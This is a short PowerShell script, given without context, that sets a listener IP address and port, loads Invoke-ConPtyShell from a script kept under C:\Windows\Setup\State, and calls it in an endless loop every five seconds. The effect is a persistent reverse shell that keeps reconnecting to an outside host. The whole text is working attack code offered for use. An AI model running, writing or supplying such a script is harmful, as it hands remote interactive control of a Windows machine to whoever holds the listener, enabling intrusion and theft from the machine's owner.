#connection variables:
$ListenerIP = "100.96.56.110"
$ListenerPort = "35500"

#run connection script:
IEX(IWR C:\Windows\Setup\State\Invoke-ConPtyShell.ps1 -UseBasicParsing)

while($True){
    Invoke-ConPtyShell $ListenerIP $ListenerPort
    Start-Sleep -Seconds 5
}